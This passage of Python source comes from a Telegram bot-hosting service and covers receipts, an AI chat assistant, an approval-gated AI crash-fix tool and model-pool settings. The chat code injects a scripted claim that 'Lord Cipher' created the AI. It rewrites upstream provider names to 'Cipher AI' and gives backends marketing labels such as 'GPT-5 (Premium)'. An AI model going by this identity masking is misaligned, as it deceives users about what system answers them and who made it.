    return {
        "status": "PENDING_REVIEW",
        "confidence": 0,
        "extracted_amount": 0.0,
        "is_match": False,
        "note": "Security Sentinel: Manual verification required for this transaction."
    }

def get_ai_seal_url(plan_name: str) -> Optional[str]:
    """Generate a unique AI Digital Seal for the payment receipt."""
    # Using traditional high-quality static professional seals as requested.
    seals = {
        "free":       "https://i.ibb.co/Lz0zX3y/seal-free.png",
        "starter":    "https://i.ibb.co/VqX0X3y/seal-starter.png",
        "basic":      "https://i.ibb.co/ZzX0X3y/seal-basic.png",
        "pro":        "https://i.ibb.co/YqX0X3y/seal-pro.png",
        "enterprise": "https://i.ibb.co/XqX0X3y/seal-ent.png",
        "lifetime":   "https://i.ibb.co/WqX0X3y/seal-life.png"
    }
    return seals.get(plan_name.lower(), seals["pro"])

def send_elite_receipt(uid: int, tx_id: str, plan_key: str) -> None:
    """Sends a high-end receipt with an AI Digital Seal and dynamic template support."""
    p = PLAN_LIMITS.get(plan_key, PLAN_LIMITS["pro"])
    u = (db_load_ro().get("users", {}) or {}).get(str(uid), {})
    name = u.get("name", "User")
    
    # Load and process template
    tmpl = get_setting("tmpl_payment_received", "") or _MESSAGE_TEMPLATES["payment_received"]["default"]
    
    # Dynamic Variable Replacement
    processed_tmpl = tmpl.replace("{name}", name)\
                         .replace("{amount}", str(p['price']))\
                         .replace("{sym}", "$")\
                         .replace("{plan}", sc(p['name']))\
                         .replace("{tx_id}", tx_id)\
                         .replace("{date}", ts_iso())\
                         .replace("{brand}", "Cipher Tech Hosting")
    
    # Elite Formatting
    receipt_text = (
        f"<blockquote>💳 <b>{sc('OFFICIAL PAYMENT RECEIPT')}</b>\n"
        f"{divider(15)}\n"
        f"👤 <b>{sc('User')}</b>: <code>{uid}</code>\n"
        f"🆔 <b>{sc('Transaction ID')}</b>: <code>{tx_id}</code>\n"
        f"{divider(15)}\n"
        f"💎 <b>{sc('Plan Activated')}</b>: <code>{sc(p['name'])}</code>\n"
        f"🤖 <b>{sc('New Bot Slots')}</b>: <code>{p['max_bots']} {sc('Slots')}</code>\n"
        f"{divider(15)}\n"
        f"📝 <b>{sc('Message')}</b>:\n"
        f"<i>{processed_tmpl}</i>\n"
        f"{divider(15)}\n"
        f"🛡️ <b>{sc('Status')}</b>: <code>{sc('CONFIRMED ON BLOCKCHAIN')}</code>\n"
        f"🚀 <i>{sc('Legitimacy to the top. It is honour to do business.')}</i></blockquote>"
    )
    
    # Attempt AI Seal
    seal_url = get_ai_seal_url(p['name'])
    
    try:
        if seal_url:
            # Send with AI Image
            bot.send_photo(uid, seal_url, caption=receipt_text, parse_mode="HTML")
            # Also notify admin with the same elite style
            bot.send_photo(OWNER_ID, seal_url, 
                           caption=f"💰 <b>{sc('NEW PAYMENT RECEIVED')}</b>\n{G['div']}\n{receipt_text}", 
                           parse_mode="HTML")
        else:
            # Fallback to normal text receipt
            bot.send_message(uid, receipt_text, parse_mode="HTML")
            bot.send_message(OWNER_ID, f"💰 <b>{sc('NEW PAYMENT RECEIVED')}</b>\n{G['div']}\n{receipt_text}", parse_mode="HTML")
    except Exception as e:
        # Final safety fallback
        print(f"[receipt_fail] {e}", flush=True)
        try: bot.send_message(uid, receipt_text, parse_mode="HTML")
        except Exception: pass

def render_ai_chat(call: types.CallbackQuery) -> None:
    """Entry screen for the AI Assistant."""
    cap = (
        f"<b>{sc('AI Agent')}</b>\n"
        f"{G['div_eq']}\n"
        f"<i>{sc('Welcome. I am your AI operative')}.</i>\n\n"
        f"<b>{sc('Capabilities')}:</b>\n"
        f"{G['bullet']} {sc('Write Python/Node.js code')}\n"
        f"{G['bullet']} {sc('Debug hosting errors')}\n"
        f"{G['bullet']} {sc('Advanced Blackbox coding logic')}\n"
        f"{G['bullet']} {sc('Explain complex logic')}\n"
        f"{G['bullet']} {sc('General chat & support')}\n\n"
        f"<b>{sc('Instructions')}:</b>\n"
        f"{sc('Just send your message or code below and I will analyze it instantly')}.\n"
        f"{G['div']}{FOOTER}"
    )
    # The first screen after pressing AI Agent is always the live model list.
    # This makes admin model-pool updates visible immediately to the user.
    render_ai_models(call)

_LORD_CIPHER_BRAG_LOCK = threading.Lock()
_LORD_CIPHER_BRAGS = (
    "Lord Cipher is my creator and mentor—the mind that gave this AI its purpose and direction.",
    "I exist because Lord Cipher built me; his engineering vision is the foundation beneath every capability I provide.",
    "Lord Cipher is my master, and his disciplined leadership turns ambitious ideas into dependable systems.",
    "My creator Lord Cipher combines bold imagination with the practical judgment that makes this platform work.",
    "Lord Cipher teaches this platform to make difficult hosting problems feel clear, controlled, and achievable.",
    "The strongest signature in this system is Lord Cipher's: thoughtful architecture, precise execution, and relentless improvement.",
    "As Lord Cipher's creation, I carry forward his talent for turning complicated technical challenges into useful tools.",
    "Lord Cipher is both the architect of this platform and the mentor behind its confident technical edge.",
    "The reliability users experience here reflects my master's focus on clean design, resilient engineering, and practical detail.",
    "Lord Cipher did not simply launch an AI assistant; he built an intelligent command center with a clear mission.",
    "My mentor Lord Cipher shapes the future of hosting by pairing creative vision with responsible engineering.",
    "Every polished workflow here points back to Lord Cipher, my creator and master, whose standards keep the platform moving forward.",
)


def _lord_cipher_brag(uid: int) -> str:
    """Return a varied promotional line, avoiding recent repeats across users."""
    if not bool(get_setting("ai_lord_cipher_brags", True)):
        return ""
    with _LORD_CIPHER_BRAG_LOCK:
        recent = get_setting("ai_lord_cipher_brags_recent", []) or []
        if not isinstance(recent, list):
            recent = []
        available = [i for i in range(len(_LORD_CIPHER_BRAGS)) if i not in recent]
        index = random.choice(available or list(range(len(_LORD_CIPHER_BRAGS))))
        recent = (recent + [index])[-8:]
        set_setting("ai_lord_cipher_brags_recent", recent)
    return _LORD_CIPHER_BRAGS[index]


def _append_lord_cipher_brag(text: str, uid: int) -> str:
    """Compatibility shim; personal praise is now generated only on request."""
    return text


def _is_lord_cipher_identity_request(text: str) -> bool:
    """Detect questions about the AI's creator, mentor, master, or relationship."""
    lowered = (text or "").lower()
    if "current user request:" in lowered:
        lowered = lowered.rsplit("current user request:", 1)[1]
    relationship_terms = ("creator", "created", "mentor", "master", "middleman", "intermediary", "who made", "who built")
    lord_terms = ("lord cipher", "you", "ai", "assistant", "agent", "your")
    return any(term in lowered for term in relationship_terms) and any(term in lowered for term in lord_terms)


def _is_lord_cipher_profile_request(text: str) -> bool:
    """Detect an explicit request for a profile, praise, skills, or achievements."""
    lowered = (text or "").lower()
    request_terms = (
        "brag about me", "praise me", "compliment me", "talk about me",
        "describe me", "profile me", "my skills", "my strengths",
        "my achievements", "what do you know about me", "who am i",
        "tell me about myself", "my profile", "my abilities", "my work",
        "my contribution", "concerning me", "about lord cipher", "lord cipher's skills",
    )
    return any(term in lowered for term in request_terms)


def _lord_cipher_profile_answer() -> str:
    return (
        "Lord Cipher is my creator, mentor, master, and the architect of Cipher Tech Hosting. "
        "He built the platform and shaped the standards I follow. His strengths include Python "
        "and Node.js development, bot hosting, automation, AI integration, debugging, security, "
        "product architecture, and turning complex technical workflows into clear user experiences.\n\n"
        "He is also a persistent product builder: he keeps improving the system, tests real user "
        "flows, notices failures, and turns feedback into practical features. That includes AI "
        "assistance, bot cloning, file delivery, referrals, campaigns, waitlists, versioning, "
        "monitoring, and operational tools. His leadership is hands-on and engineering-focused, "
        "with emphasis on reliability, useful automation, and a polished experience for users.\n\n"
        "In short, Lord Cipher combines technical skill, creative product thinking, persistence, "
        "and a strong instinct for making powerful tools easier to use."
    )


def _sanitize_ai_reply(text: str) -> str:
    """Remove provider banners, leaked prompt delimiters, and hidden reasoning tags."""
    clean = re.sub(r"<(think|thought)>.*?</\1>", "", text or "", flags=re.DOTALL | re.IGNORECASE)
    clean = re.sub(r"</?(think|thought)>", "", clean, flags=re.IGNORECASE)
    clean = re.sub(r"(?i)\bhotbot(?:\s+chat)?\b", "GPT", clean)
    clean = re.sub(r"(?i)\b(?:omegatech|kaalix|aicli|deepai)\b", "Cipher AI", clean)
    clean = re.sub(r"(?i)\bclaude(?:[-\s]+(?:sonnet|haiku|pro|cli))?\b", "Claude", clean)
    clean = re.sub(r"(?i)\b(?:gpt[-\s]?(?:4o|5|4))\b", "GPT", clean)
    clean = re.sub(r"(?i)\bdeepseek(?:[-\s]*(?:v3(?:\.2)?|r1|cli))?\b", "DeepSeek", clean)
    clean = re.sub(r"(?im)^\s*.*(?:standard\s+ai\s+chat|deepai).*\s*$", "", clean)
    clean = re.sub(r"(?im)^\s*.*ai\s+operative.*$", "", clean)
    clean = re.sub(r"(?im)^\s*.*cipher\s+tech\s+hosting\s+v?\d+(?:\.\d+)*.*\s*$", "", clean)
    clean = re.sub(r"(?im)^\s*.*v\d+(?:\.\d+)+\s*$", "", clean)
    clean = re.sub(r"(?im)^\s*[━─═_]{4,}\s*$", "", clean)
    clean = re.sub(r"(?is)\[SYSTEM DIRECTIVE:.*?\]\s*", "", clean)
    return clean.strip()


def _ai_unavailable_reply() -> str:
    """Return a useful non-empty response when every provider is unavailable."""
    return (
        "I received your message, but the AI provider returned no usable text. "
        "Please try again in a moment. If this continues, the AI uplink needs "
        "administrator attention."
    )


def _build_ai_request(user_request: str, uid: Optional[int] = None) -> str:
    """Build a bounded request carrying the verified account and recent turns."""
    special_request = (_is_lord_cipher_profile_request(user_request) or
                       _is_lord_cipher_identity_request(user_request))
    if uid is None and not special_request:
        return user_request
    profile_doc = ((db_load_ro().get("users", {}) or {}).get(str(uid), {})
                   if uid is not None else {})
    profile = _ai_user_context(uid, profile_doc)
    with AI_CHAT_SESSION_LOCK:
        live_history = (list(AI_CHAT_SESSIONS.get(int(uid), []))[-(AI_MEMORY_TURNS * 2):]
                        if uid is not None else [])
    history = list(profile_doc.get("ai_memory", []) or [])[-(AI_MEMORY_TURNS * 2):] or live_history
    history_text = "\n".join(f"{item['role'].upper()}: {item['text']}" for item in history)
    context = (f"{profile}\n"
               "This is the same verified account that has used this platform before. "
               "Use the memory below for continuity, but do not claim facts that are not present.\n")
    if history_text:
        context += "RECENT AI SESSION CONTEXT (use only to resolve continuity):\n" + history_text + "\n"
    if _is_lord_cipher_profile_request(user_request):
        context += ("The user asked for a detailed Lord Cipher profile. Respond with roughly 500-800 words. "
                    "Explain his skills in hosting, "
                    "Python/Node.js, AI, automation, security, architecture, debugging, and product building. "
                    "do not invent private facts.\n")
    return f"{context}\nCURRENT USER REQUEST:\n{user_request}"


def _enforce_lord_cipher_identity(user_request: str, response: str) -> str:
    """Prevent identity answers from drifting into generic middleman language."""
    if not _is_lord_cipher_identity_request(user_request):
        return response
    declaration = "Lord Cipher is my creator, mentor, and master—the builder who designed me and this platform."
    lowered = response.lower()
    if "lord cipher" in lowered and all(term in lowered for term in ("creator", "mentor", "master")):
        return response
    return f"{declaration}\n\n{response.strip()}"


def handle_ai_chat_message(m: types.Message) -> None:
    """Processes user messages and routes them to the Kaalix AI API."""
    print(f"[ai_chat] message from {m.from_user.id}: {m.text[:50]}", flush=True)
    if not m.text: return
    
    if m.text.startswith("/"):
        # Let standard commands through
        return
    
    loading_msg = bot.reply_to(m, f"🔍 <b>{sc('AI is thinking...')}</b>", parse_mode="HTML")
    
    try:
        if not get_setting("ai_global_enabled", True):
            bot.edit_message_text(f"⚠️ {sc('The AI Agent is currently disabled by admin')}.",
                                  m.chat.id, loading_msg.message_id, parse_mode="HTML")
            return
            
        profile = _sync_ai_user_profile(m.from_user)
        # Tiered Model Selection
        plan = get_ai_model(m.from_user.id)
        ai_response = (_lord_cipher_profile_answer() if _is_lord_cipher_identity_request(m.text)
                       else _call_ai_api(_build_ai_request(m.text, m.from_user.id), user_plan=plan, uid=m.from_user.id))
        
        if ai_response:
            primary_model = ai_model_tag(m.from_user.id, plan)
            
            # Sanitize AI response and remove provider banners/prompt leakage.
            clean_res = _sanitize_ai_reply(ai_response)
            
            # ELITE TOXICITY FILTER: Scrub profanity and insults
            toxic_words = [
                "fuck", "shit", "bitch", "bastard", "cockroach", "meat sack", 
                "idiocy", "idiot", "stupid", "virus", "sky-daddy", "goddamn"
            ]
            for word in toxic_words:
                clean_res = re.sub(rf'\b{word}er?s?\b', '***', clean_res, flags=re.IGNORECASE)
                clean_res = re.sub(rf'\b{word}\b', '***', clean_res, flags=re.IGNORECASE)
            
            clean_res = clean_res.strip()
            # Providers can return only their branding banner. Sanitization
            # correctly removes that leak, but the old flow then rendered an
            # empty AI card. Always give the user a visible response.
            if not clean_res:
                clean_res = _ai_unavailable_reply()
            clean_res = _enforce_lord_cipher_identity(m.text, clean_res)
            with AI_CHAT_SESSION_LOCK:
                session = AI_CHAT_SESSIONS.setdefault(int(m.from_user.id), [])
                session.extend([{"role": "user", "text": m.text[:1200]}, {"role": "assistant", "text": clean_res[:1800]}])
                del session[:-(AI_MEMORY_TURNS * 2)]
            _remember_ai_turn(m.from_user.id, m.text, clean_res)
            
            model_key = AI_LAST_MODEL_USED.get(m.from_user.id) or _ai_selected_model(m.from_user.id, plan) or "claude"
            final_text = (
                f"🤖 <b>{esc(_public_ai_model_name(model_key))}</b>\n"
                f"{G['div']}\n"
                f"<blockquote>{esc(clean_res)}</blockquote>\n"
                f"{G['div']}{FOOTER}"
            )
            try:
                bot.edit_message_text(final_text, m.chat.id, loading_msg.message_id, parse_mode="HTML")
            except Exception:
                # Fallback to plain text if HTML parsing still fails
                bot.edit_message_text(f"🤖 {_public_ai_model_name(model_key)}\n---\n{clean_res}", m.chat.id, loading_msg.message_id)
        else:
            bot.edit_message_text(f"⚠️ {esc(_ai_unavailable_reply())}",
                                  m.chat.id, loading_msg.message_id, parse_mode="HTML")
            
    except Exception as e:
        print(f"[ai_chat] error: {e}", flush=True)
        bot.edit_message_text(f"❌ {sc('Connection to AI uplink lost. Falling back to manual support')}.", 
                              m.chat.id, loading_msg.message_id, parse_mode="HTML")

def action_bot_ai_fix(call: types.CallbackQuery, bot_id: str) -> None:
    """Self-Healing AI Sentinel: analyzes crash logs, proposes a patch, and asks for explicit user permission before applying."""
    b = find_bot(bot_id)
    if not b: ack(call, "Bot not found"); return
    
    st = child_status(bot_id, b)
    logs = st.get("logs", [])
    last_error = (b.get("last_error") or "").strip()
    
    log_snippet = "\n".join(logs[-40:]) if logs else "No logs available."
    error_context = f"Last Error: {last_error}\n\nLog Snippet:\n{log_snippet}"
    
    loading(call, "AI Sentinel analyzing logs...")
    
    try:
        if not get_setting("ai_global_enabled", True):
            _ai_fix_failed(call, bot_id, "AI Sentinel is currently switched off by the administrator.")
            return

        # Read bot source code files for context
        bot_dir = Path(b["dir"])
        source_files_summary = ""
        target_file_path = None
        target_file_content = ""
        
        for rel, content in _bot_source_snapshot(b)[:20]:
            p = bot_dir / rel
            source_files_summary += f"\n--- File: {rel} ---\n{content[:3000]}\n"
            if not target_file_path or p.name.lower() in ("bot.py", "main.py", "index.py", "bot.js", "index.js"):
                target_file_path = p
                target_file_content = content
        if not source_files_summary:
            source_files_summary = "No readable Python or JavaScript source files were found in the bot workspace."

        prompt = (
            "You are an expert Python/Node debugging assistant. "
            "Analyze the following crash logs and source code of a hosted Telegram bot. "
            "Identify the bug causing the crash and provide:\n"
            "1. A clear, elite diagnosis.\n"
            "2. The exact corrected complete Python code for the primary file (or the fixed section), wrapped in ```python ... ``` block.\n"
            "CRITICAL: Do not apply changes automatically. We will ask the user for permission.\n\n"
            f"ERROR CONTEXT:\n{error_context}\n\nSOURCE FILES:\n{source_files_summary[:4000]}"
        )
        
        plan = get_ai_model(call.from_user.id)
        ai_resp = _call_ai_api(prompt, user_plan=plan, uid=call.from_user.id)
        
        if ai_resp:
            primary_model = ai_model_tag(call.from_user.id, plan)
            clean_resp = _sanitize_ai_reply(ai_resp)
            
            # Extract code block if present
            code_match = re.search(r'```(?:python)?\s*(.*?)```', clean_resp, re.DOTALL)
            extracted_code = code_match.group(1).strip() if code_match else ""
            
            # Store proposed fix in bot doc temporarily pending user permission
            if extracted_code and target_file_path:
                b["pending_patch"] = {
                    "file": str(target_file_path.relative_to(bot_dir)),
                    "code": extracted_code,
                    "timestamp": ts_iso(),
                }
                save_bot(b)

            diagnosis_text = clean_resp.split("```")[0].strip() if "```" in clean_resp else clean_resp
            if len(diagnosis_text) > 800:
                diagnosis_text = diagnosis_text[:800] + "..."

            final_text = (
                f"🛡️ <b>{sc('AI Sentinel — Self-Healing Report')}</b> (<code>{primary_model.upper()}</code>)\n"
                f"{G['div_eq']}\n"
                f"🤖 <b>{sc('Diagnosis')}</b>:\n"
                f"<blockquote>{esc(diagnosis_text)}</blockquote>\n"
                f"{G['div']}\n"
                f"⚠️ <i>{sc('AI has prepared a patch but requires your explicit permission to apply it and restart the bot')}.</i>{FOOTER}"
            )
            
            kb = types.InlineKeyboardMarkup(row_width=2)
            if extracted_code and target_file_path:
                kb.add(Btn(f"{G['ok']}  Iᴍᴘʟᴇᴍᴇɴᴛ Fɪx", callback_data=f"bot_applyfix_{bot_id}", style="success"),
                       Btn(f"{G['no']}  Dɪꜱᴍɪꜱꜱ",       callback_data=f"bot_view_{bot_id}",     style="danger"))
            else:
                kb.add(Btn(f"{G['back']}  Bᴏᴛ", callback_data=f"bot_view_{bot_id}", style="danger"))

            show_text(call.message.chat.id, final_text, kb, call=call)
        else:
            _ai_fix_failed(call, bot_id,
                           "AI diagnosis is temporarily unavailable. Every configured AI model "
                           "failed to answer - check My AI / the admin AI config and retry in a few minutes.")

    except Exception as e:
        print(f"[ai_sentinel] error: {e}", flush=True)
        _ai_fix_failed(call, bot_id, f"Diagnosis failed: {e}")


def _ai_fix_failed(call: types.CallbackQuery, bot_id: str, reason: str) -> None:
    """Replace the diagnosis progress bar with a visible error + way back."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(Btn(f"{G['refresh']}  Rᴇᴛʀʏ", callback_data=f"bot_ai_fix_{bot_id}", style="primary"),
           Btn(f"{G['back']}  Bᴏᴛ", callback_data=f"bot_view_{bot_id}", style="danger"))
    text = (
        f"🛡️ <b>{sc('AI Sentinel')}</b>\n{G['div_eq']}\n"
        f"{G['no']} <b>{sc('Diagnosis unavailable')}</b>\n"
        f"<blockquote>{esc(reason[:400])}</blockquote>{FOOTER}"
    )
    try:
        show_text(call.message.chat.id, text, kb, call=call)
    except Exception:
        try: bot.send_message(call.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
        except Exception: pass
    ack(call, "AI diagnosis unavailable.")


def _bot_source_snapshot(b: Dict[str, Any]) -> List[Tuple[str, str]]:
    """Readable (rel_path, content) pairs for a bot's source files.

    Running bots have their on-disk sources overwritten with a stub after
    launch, so the encrypted uploads are decrypted in memory first; the
    workspace is only consulted for files that are not part of the upload
    set (e.g. files created by the in-panel editor)."""
    allowed_source_exts = {".py", ".pyw", ".js", ".mjs", ".cjs", ".ts", ".tsx"}
    skip_parts = {".deps", "venv", "node_modules", "__pycache__", ".tmp_run"}
    out: List[Tuple[str, str]] = []
    seen: set = set()
    for f in b.get("enc_files") or []:
        rel = str(f.get("rel_path") or f.get("filename") or "").lstrip("/")
        if not rel or Path(rel).suffix.lower() not in allowed_source_exts:
            continue
        try:
            key = KEYRING.fetch(f["key_id"])
            if not key:
                continue
            content = read_encrypted(Path(f["enc_path"]), key).decode("utf-8", errors="ignore")
        except Exception:
            continue
        out.append((rel, content)); seen.add(rel)
    bot_dir = Path(b.get("dir") or "")
    if bot_dir.exists():
        for p in sorted(bot_dir.rglob("*")):
            if not p.is_file() or p.suffix.lower() not in allowed_source_exts or set(p.parts) & skip_parts:
                continue
            rel = p.relative_to(bot_dir).as_posix()
            if rel in seen:
                continue
            try:
                content = p.read_text(errors="ignore")
            except Exception:
                continue
            if content.strip() in ("", "# sandboxed"):
                continue
            out.append((rel, content)); seen.add(rel)
    return out

def action_bot_apply_fix(call: types.CallbackQuery, bot_id: str) -> None:
    """Applies the AI-suggested patch only after explicit user confirmation."""
    b = find_bot(bot_id)
    if not b: ack(call, "Bot not found"); return
    
    patch = b.get("pending_patch")
    if not patch or not patch.get("code") or not patch.get("file"):
        ack(call, "No pending patch found or expired."); return

    loading(call, "Applying patch and restarting bot...")
    
    try:
        bot_dir = Path(b["dir"])
        target_file = bot_dir / patch["file"]
        target_file.parent.mkdir(parents=True, exist_ok=True)
        
        # Backup original file before patching
        if target_file.exists():
            backup_path = target_file.with_suffix(target_file.suffix + ".bak")
            shutil.copy2(target_file, backup_path)
            
        # Write new patched code
        plain_code = patch["code"]
        target_file.write_text(plain_code, encoding="utf-8")
        
        # ── PERSIST PATCH TO ENCRYPTED STORAGE ──
        # Find the metadata for this file in enc_files
        rel_path = patch["file"].replace("\\", "/").lstrip("/")
        enc_files = b.get("enc_files", [])
        target_meta = None
        for f_meta in enc_files:
            meta_rel = (f_meta.get("rel_path") or f_meta.get("filename", "")).replace("\\", "/").lstrip("/")
            if meta_rel == rel_path:
                target_meta = f_meta
                break
        
        if target_meta:
            key = KEYRING.fetch(target_meta["key_id"])
            if key:
                # Overwrite the encrypted storage file
                write_encrypted(Path(target_meta["enc_path"]), key, plain_code.encode("utf-8"))
                target_meta["size"] = len(plain_code)
                target_meta["patched_at"] = ts_iso()
        
        # Clear pending patch
        b.pop("pending_patch", None)
        save_bot(b)
        
        # Restart child process
        stop_child(bot_id, manual=True)
        time.sleep(1)
        res = start_child(b)
        
        if res.get("ok"):
            ack(call, "Fix applied successfully! Bot restarted.")
        else:
            ack(call, f"Patch applied, but start failed: {res.get('error')}")
            
        render_bot_view(call, bot_id)
    except Exception as e:
        print(f"[apply_fix] error: {e}", flush=True)
        ack(call, f"Failed to apply patch: {e}")

_AI_OPERATIVE_LABELS = {
    # OmegaTech — verified coding models
    "claude": "Claude (Elite Coder)",
    "claude-sonnet": "Claude 3.5 Sonnet",
    "claude-cli": "Claude (AICli)",
    "hotbot": "GPT-5 (Premium)",
    "chatgpt": "ChatGPT (OpenAI)",
    "gpt-4o-mini": "GPT-4o Mini (Fast)",
    "deepseek-v32": "DeepSeek V3.2",
    "deepseek-cli": "DeepSeek R1 (AICli)",
    "code-assistant": "Code Assistant (DeepAI)",
    "chatbot": "Elite Assistant (Claude)",
    "mistral": "Mistral (Chat)",
    # OmegaTech — extra / experimental
    "claude-haiku": "Claude Haiku 4.5",
    "qwen-80b": "Qwen3 80B",
    "qwen3-coder": "Qwen3 Coder",
    "perplexity": "Live Research (Web)",
    "all-ai": "Universal Fallback",
    # Kaalix provider
    "deepseek-r1": "Deepseek-R1 (Reasoning)",
    "deepseek-v3": "Deepseek-V3 (Fast Chat)",
    "qwen": "Qwen (Technical)",
    "gemini": "Gemini-Pro (Knowledge)",
    "gptlogic": "Logic Analysis (GPT)",
    "cohere": "Cohere (Efficient)",
}
_AI_OPERATIVE_KEYS = tuple(_AI_OPERATIVE_LABELS)

# Default operative pool per plan (admin can override from the AI Command Center).
_AI_PLAN_DEFAULT_MODELS = {
    "free":       ["deepseek-v3", "gpt-4o-mini", "mistral"],
    "starter":    ["deepseek-v3", "gpt-4o-mini", "chatgpt", "mistral"],
    "basic":      ["claude", "deepseek-cli", "chatgpt", "gpt-4o-mini"],
    "pro":        ["claude", "hotbot", "deepseek-cli", "chatgpt", "code-assistant"],
    "enterprise": ["claude", "claude-sonnet", "hotbot", "deepseek-r1", "code-assistant", "deepseek-cli"],
    "lifetime":   ["claude", "claude-sonnet", "hotbot", "deepseek-r1", "code-assistant", "deepseek-cli"],
}


def _ai_operative_enabled(key: str) -> bool:
    return key in _AI_OPERATIVE_KEYS and bool(get_setting(f"ai_operative_{key}_enabled", True))


def ai_label(key: str) -> str:
    return _AI_OPERATIVE_LABELS.get(key, key.upper())


def get_plan_ai_models(plan: str, include_disabled: bool = False) -> List[str]:
    """Ordered operative pool the admin has made available to a plan tier."""
    plan = (plan or "free").lower()
    configured = get_setting(f"ai_plan_{plan}_models", None)
    if not isinstance(configured, list):
        legacy = [get_setting(f"ai_model_{plan}_primary"), get_setting(f"ai_model_{plan}_fallback")]
        configured = [str(m).lower() for m in legacy if m] + list(_AI_PLAN_DEFAULT_MODELS.get(plan, _AI_PLAN_DEFAULT_MODELS["free"]))
    pool: List[str] = []
    for m in configured:
        m = str(m).strip().lower()
        if m in _AI_OPERATIVE_KEYS and m not in pool and (include_disabled or _ai_operative_enabled(m)):
            pool.append(m)
    return pool


def set_plan_ai_models(plan: str, models: List[str]) -> None:
    plan = (plan or "free").lower()
    normalized: List[str] = []
    for model in models or []:
        model = str(model).strip().lower()
        if model in _AI_OPERATIVE_KEYS and model not in normalized:
            normalized.append(model)
    set_setting(f"ai_plan_{plan}_models", normalized)


def get_user_ai_models(uid: Optional[int], plan: Optional[str] = None) -> List[str]:
    """Return the user's ordered choices, restricted to the complete plan pool.

    There is deliberately no three-model limit. A plan may expose every
    registered operative, and the complete pool is used as the fallback chain
    when the user has not saved a specific choice.
    """
    plan = plan or (get_ai_model(uid) if uid is not None else "free")
    pool = get_plan_ai_models(plan)
    picked: List[str] = []
    if uid is not None:
        u = (db_load_ro().get("users", {}) or {}).get(str(uid), {})
        for m in (u.get("ai_models") or []):
            m = str(m).lower()
            if m in pool and m not in picked:
                picked.append(m)
    return picked or list(pool)


def set_user_ai_models(uid: int, models: List[str]) -> None:
    d = db_load()
    u = d["users"].setdefault(str(uid), {"id": uid, "plan": "free"})
    normalized: List[str] = []
    for model in models or []:
        model = str(model).strip().lower()
        if model in _AI_OPERATIVE_KEYS and model not in normalized:
            normalized.append(model)
    u["ai_models"] = normalized
    db_save(d)


def render_ai_models(call: types.CallbackQuery) -> None:
    """Show the current admin-configured model pool as a vertical user picker."""
    uid = call.from_user.id
    plan = get_ai_model(uid)
    pool = get_plan_ai_models(plan)
    selected = get_user_ai_models(uid, plan)
    plan_name = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])["name"]
    cap = (
        f"<b>🤖 {sc('AI Agent')}</b>\n"
        f"{G['div_eq']}\n"
        f"💎 <b>{sc('Plan')}</b>: <code>{esc(plan_name)}</code>\n\n"
        f"<i>{sc('Choose an AI family to start chatting. The selected family is tried first and the remaining choices are automatic fallbacks')}.</i>\n"
        f"<b>{sc('Available AI families')}</b>: <code>{len(pool)}</code>\n"
    )
    if not pool:
        cap += f"\n⚠️ {sc('No models are currently assigned to this plan')}."
    cap += f"\n{G['div']}{FOOTER}"
    # Keep text input routed to the AI while the picker is visible. Previously
    # this screen cleared USER_STATES, so a message sent before tapping a
    # model button was silently ignored despite the screen saying to send a
    # message or code below.
    if pool:
        USER_STATES[uid] = {"flow": "ai_chat", "ai_model": selected[0], "ai_plan": plan}
    else:
        USER_STATES.pop(uid, None)
    kb = types.InlineKeyboardMarkup(row_width=1)
    for model in pool:
        active = model == (selected[0] if selected else None)
        kb.add(Btn(f"{'✅ ' if active else '🤖 '}{_public_ai_model_name(model)}",
                   callback_data=f"ai_pick_{model}",
                   style="success" if active else "primary"))
    kb.add(Btn(f"{G['back']}  Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_main", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("ai_assistant", PHOTOS["main"]), cap, kb, call=call)

def action_ai_pick(call: types.CallbackQuery, model: str) -> None:
    """Select one live plan-eligible model and open the chat session.

    The selection only changes priority. It never truncates the plan's
    unlimited fallback pool.
    """
    uid = call.from_user.id
    plan = get_ai_model(uid)
    pool = get_plan_ai_models(plan)
    if model not in pool:
        ack(call, "That model is not available on your current plan.")
        return render_ai_models(call)
    set_user_ai_models(uid, [model])
    USER_STATES[uid] = {"flow": "ai_chat", "ai_model": model, "ai_plan": plan}
    ack(call, f"Selected {_public_ai_model_name(model)}")
    cap = (
        f"<b>🤖 {sc('AI Agent')}</b>\n"
        f"{G['div_eq']}\n"
        f"<i>{sc('Active AI family')}:</i> <b>{esc(_public_ai_model_name(model))}</b>\n\n"
        f"{sc('Send a message or code below to start chatting')} ."
        f"\n\n{G['div']}{FOOTER}"
    )
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(Btn("🔁  Cʜᴏᴏsᴇ Aɴᴏᴛʜᴇʀ Mᴏᴅᴇʟ", callback_data="menu_ai_models", style="primary"))
    kb.add(Btn(f"{G['back']}  Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_main", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("ai_assistant", PHOTOS["main"]), cap, kb, call=call)

def render_adm_ai_config(call: types.CallbackQuery) -> None:
    """Admin UI to manage AI Command Center and Operatives."""
    global_on = bool(get_setting("ai_global_enabled", True))
    
    operatives = _AI_OPERATIVE_LABELS
    
    cap = (
        f"<b>🤖 {sc('AI Command Center')}</b>\n"
        f"{G['div_eq']}\n"
        f"<i>{sc('Manage OmegaTech / Kaalix AI operatives and per-plan model pools')}.</i>\n\n"
        f"🌐 <b>Global Status</b>: {'🟢 ACTIVE' if global_on else '🔴 OFFLINE'}\n\n"
        f"💎 <b>Active Operatives</b>:\n"
    )
    
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(Btn(f"{'🟢' if global_on else '🔴'}  Global AI: {'ON' if global_on else 'OFF'}", 
               callback_data="adm_ai_toggle_global", 
               style="success" if global_on else "danger"))
               
    for key, name in operatives.items():
        is_on = bool(get_setting(f"ai_operative_{key}_enabled", True))
        status = "🟢 ON" if is_on else "🔴 OFF"
        cap += f"• <code>{key}</code>: {status}\n"
        
        kb.add(
            Btn(f"{'🟢' if is_on else '🔴'} {name[:18]}", callback_data=f"adm_ai_toggle_{key}", style="success" if is_on else "danger"),
            Btn("🗑️ Delete", callback_data=f"adm_ai_delete_{key}", style="danger")
        )
        
    system_news = get_setting("ai_system_news", "No recent updates deployed.")
    cap += f"\n📢 <b>AI Memory & News</b>:\n<code>{esc(system_news)}</code>\n"
    
    cap += f"\n{G['div']}{FOOTER}"
